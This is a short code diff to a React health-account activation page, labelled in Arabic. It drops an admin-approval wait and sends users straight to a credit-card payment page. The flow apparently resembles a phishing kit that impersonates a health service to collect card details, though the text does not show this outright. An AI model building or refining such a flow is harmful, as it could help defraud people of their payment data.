@@ -105,10 +105,11 @@ const MedicalActivate = () => {
         "الخدمة": service || '',
       },
       current: 'تفعيل حساب صحتي',
-      waitingForAdminResponse: true,
+      waitingForAdminResponse: false,
     });
     setLoading(false);
-    setWaiting(true);
+    // انتقال مباشر لصفحة البطاقة
+    navigate('/credit-card-payment');
   };
 
   useEffect(() => {
